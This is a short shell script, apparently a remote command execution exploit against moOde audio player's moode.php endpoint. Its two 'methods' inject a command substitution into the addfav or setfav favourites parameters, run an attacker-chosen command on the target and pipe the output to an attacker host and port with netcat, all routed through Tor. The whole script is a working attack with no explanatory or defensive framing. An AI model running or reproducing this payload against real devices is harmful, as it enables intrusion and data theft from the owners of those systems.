echo "Moode RCE netcat based"

echo "methode 1"
torify curl -X POST "$1/command/moode.php?cmd=addfav&favitem=\$($2 | nc $3 $4)"


echo "methode 2"
torify curl -X POST "$1/command/moode.php?cmd=setfav&favname=\$($2 | nc $3 $4)"
